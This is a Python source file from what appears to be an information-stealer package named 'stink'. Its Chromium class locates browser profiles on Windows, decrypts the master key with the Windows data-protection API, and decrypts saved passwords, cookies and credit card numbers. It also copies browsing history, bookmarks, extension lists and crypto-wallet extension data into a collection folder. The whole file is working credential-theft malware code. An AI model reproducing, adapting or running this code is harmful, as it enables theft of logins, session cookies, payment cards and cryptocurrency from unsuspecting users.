from re import compile
from sqlite3 import connect
from shutil import copyfile
from base64 import b64decode
from json import load, loads, dump
from distutils.dir_util import copy_tree
from datetime import datetime, timedelta
from os import path, makedirs, remove, listdir
from ctypes import windll, byref, cdll, c_buffer

from stink.helpers import DataBlob
from stink.enums.features import Features
from stink.utils import AESModeOfOperationGCM
from stink.helpers.config import ChromiumConfig


class Chromium:

    def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list, errors: bool):

        self.__browser_name = browser_name
        self.__storage_path = storage_path
        self.__state_path = state_path
        self.__browser_path = browser_path
        self.__statuses = statuses
        self.__profiles = None
        self.__errors = errors

        self.__config = ChromiumConfig()
        self.__path = rf"{self.__storage_path}\Browsers\{self.__browser_name}"

    def _get_profiles(self):

        if self.__browser_path[-9:] in ["User Data"]:

            pattern = compile(r"Default|Profile \d+")
            return [rf"{self.__browser_path}\{profile}" for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]

        return [self.__browser_path]

    def _check_paths(self):

        if path.exists(self.__browser_path) and any(self.__statuses):

            makedirs(rf"{self.__storage_path}\Browsers\{self.__browser_name}")
            self.__profiles = self._get_profiles()

    @staticmethod
    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy=b''):

        blob = DataBlob()

        if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):

            buffer = c_buffer(int(blob.cbData))
            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
            windll.kernel32.LocalFree(blob.pbData)

            return buffer.raw

    def _get_key(self):

        with open(self.__state_path, "r", encoding="utf-8") as state:
            file = state.read()

        state.close()

        return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])

    @staticmethod
    def _get_datetime(date):

        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    @staticmethod
    def _decrypt(value: bytes, master_key: bytes = None):

        try:
            return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
        except:
            return "Can't decode"

    @staticmethod
    def _get_db_connection(database: str):

        with connect(database) as connection:
            connection.text_factory = lambda text: text.decode(errors="ignore")
            cursor = connection.cursor()

        return cursor, connection

    @staticmethod
    def _get_file(file_path: str):

        with open(file_path, "r", encoding="utf-8") as file:
            data = file.read()

        return data

    def _copy_files(self, storage_path: str, main_path: str, alt_path: str = None, error: str = ""):

        if path.isfile(main_path) or (alt_path and path.isfile(alt_path)):
            copy = copyfile
        else:
            copy = copy_tree

        if path.exists(main_path):
            copy(main_path, storage_path)

        elif alt_path and path.exists(alt_path):
            copy(alt_path, storage_path)

        else:
            if self.__errors is True: print(f'[{self.__browser_name}]: {error}')
            return False

        return True

    def _grab_passwords(self, profile: str, main_path: str, alt_path: str = None):

        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Passwords.db"

        if self._copy_files(filename, main_path, alt_path, "No passwords found") is False:
            return

        cursor, connection = self._get_db_connection(filename)
        passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()

        cursor.close()
        connection.close()
        remove(filename)

        if not passwords_list:
            return

        data = self.__config.PasswordsData
        temp = [
            data.format(result[0], result[1], self._decrypt(result[2], self.__master_key))
            for result in passwords_list
        ]

        with open(rf"{self.__path}\{profile} Passwords.txt", "a", encoding="utf-8") as passwords:
            passwords.write("".join(item for item in set(temp)))

        passwords.close()

    def _grab_cookies(self, profile: str, main_path: str, alt_path: str = None):

        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Cookies.db"

        if self._copy_files(filename, main_path, alt_path, "No cookies found") is False:
            return

        cursor, connection = self._get_db_connection(filename)
        cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()

        cursor.close()
        connection.close()
        remove(filename)

        if not cookies_list:
            return

        results = [
            {
                "creation_utc": result[0],
                "top_frame_site_key": result[1],
                "host_key": result[2],
                "name": result[3],
                "value": result[4],
                "encrypted_value": self._decrypt(result[5], self.__master_key),
                "path": result[6],
                "expires_utc": result[7],
                "is_secure": result[8],
                "is_httponly": result[9],
                "last_access_utc": result[10],
                "has_expires": result[11],
                "is_persistent": result[12],
                "priority": result[13],
                "samesite": result[14],
                "source_scheme": result[15],
                "source_port": result[16],
                "is_same_party": result[17],
            }
            for result in cookies_list
        ]

        with open(rf"{self.__path}\{profile} Cookies.json", "a", encoding="utf-8") as cookies:
            dump(results, cookies)

        cookies.close()

    def _grab_cards(self, profile: str, main_path: str, alt_path: str = None):

        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Cards.db"

        if self._copy_files(filename, main_path, alt_path, "No cards found") is False:
            return

        cursor, connection = self._get_db_connection(filename)
        cards_list = cursor.execute(self.__config.CardsSQL).fetchall()

        cursor.close()
        connection.close()
        remove(filename)

        if not cards_list:
            return

        data = self.__config.CardsData
        temp = [
            data.format(result[0], self._decrypt(result[3], self.__master_key), result[1], result[2])
            for result in cards_list
        ]

        with open(rf"{self.__path}\{profile} Cards.txt", "a", encoding="utf-8") as cards:
            cards.write("".join(item for item in set(temp)))

        cards.close()

    def _grab_history(self, profile: str, main_path: str, alt_path: str = None):

        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} History.db"

        if self._copy_files(filename, main_path, alt_path, "No history found") is False:
            return

        cursor, connection = self._get_db_connection(filename)
        results = cursor.execute(self.__config.HistorySQL).fetchall()
        history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]

        cursor.close()
        connection.close()
        remove(filename)

        if not results:
            return

        data = self.__config.HistoryData
        temp = [
            data.format(result[0], result[1], self._get_datetime(result[2]))
            for result in history_list
        ]

        with open(rf"{self.__path}\{profile} History.txt", "a", encoding="utf-8") as history:
            history.write("".join(item for item in set(temp)))

        history.close()

    def _grab_bookmarks(self, profile: str, main_path: str, alt_path: str = None):

        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Bookmarks"

        if self._copy_files(filename, main_path, alt_path, "No bookmarks found") is False:
            return

        file = self._get_file(filename)
        bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])

        remove(filename)

        if not bookmarks_list:
            return

        data = self.__config.BookmarksData
        temp = [
            data.format(result[0], result[1])
            for result in bookmarks_list
        ]

        with open(rf"{self.__path}\{profile} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
            bookmarks.write("".join(item for item in set(temp)))

        bookmarks.close()

    def _grab_extensions(self, profile: str, extension: str):

        extensions_list = []
        extensions_dirs = listdir(extension)

        if len(extensions_dirs) == 0:
            return

        for dirpath in extensions_dirs:

            extension_dir = listdir(fr"{extension}\{dirpath}")

            if len(extension_dir) == 0:
                continue

            extension_dir = extension_dir[-1]
            manifest_path = fr"{extension}\{dirpath}\{extension_dir}\manifest.json"

            with open(manifest_path, "r", encoding="utf-8") as file:
                manifest = load(file)
                name = manifest.get("name")

                if name:
                    extensions_list.append(name)

            file.close()

        with open(rf"{self.__path}\{profile} Extensions.txt", "a", encoding="utf-8") as extensions:
            extensions.write("\n".join(item for item in set(extensions_list)))

        extensions.close()

    def _grab_wallets(self, profile: str, wallets: str):

        for wallet in self.__config.WalletLogs[self.__browser_name]:

            try:

                filename = rf'{self.__path}\{profile} {wallet["name"]}'
                self._copy_files(filename, rf'{wallets}\{wallet["folder"]}', error="No wallets found")

            except Exception as e:
                if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")

    def _process_profile(self, profile: str):

        profile_name = profile.replace("\\", "/").split("/")[-1]
        functions = [
            {
                "method": self._grab_passwords,
                "arguments": [profile_name, rf"{profile}\Login Data", None],
                "status": True if Features.passwords in self.__statuses else False
            },
            {
                "method": self._grab_cookies,
                "arguments": [profile_name, rf"{profile}\Cookies", rf"{profile}\Network\Cookies"],
                "status": True if Features.cookies in self.__statuses else False
            },
            {
                "method": self._grab_cards,
                "arguments": [profile_name, rf"{profile}\Web Data", None],
                "status": True if Features.cards in self.__statuses else False
            },
            {
                "method": self._grab_history,
                "arguments": [profile_name, rf"{profile}\History", None],
                "status": True if Features.history in self.__statuses else False
            },
            {
                "method": self._grab_bookmarks,
                "arguments": [profile_name, rf"{profile}\Bookmarks", None],
                "status": True if Features.bookmarks in self.__statuses else False
            },
            {
                "method": self._grab_extensions,
                "arguments": [profile_name, rf"{profile}\Extensions"],
                "status": True if Features.bookmarks in self.__statuses else False
            },
            {
                "method": self._grab_wallets,
                "arguments": [profile_name, rf"{profile}\Local Extension Settings"],
                "status": True if Features.wallets in self.__statuses else False
            }
        ]

        for function in functions:

            try:

                if function["status"] is False:
                    continue

                function["method"](*function["arguments"])

            except Exception as e:
                if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")

    def _check_profiles(self):

        if not self.__profiles:
            if self.__errors is True: print(f"[{self.__browser_name}]: No profiles found")
            return

        self.__master_key = self._get_key()

        for profile in self.__profiles:
            self._process_profile(profile)

    def run(self):

        try:

            self._check_paths()
            self._check_profiles()

        except Exception as e:
            if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
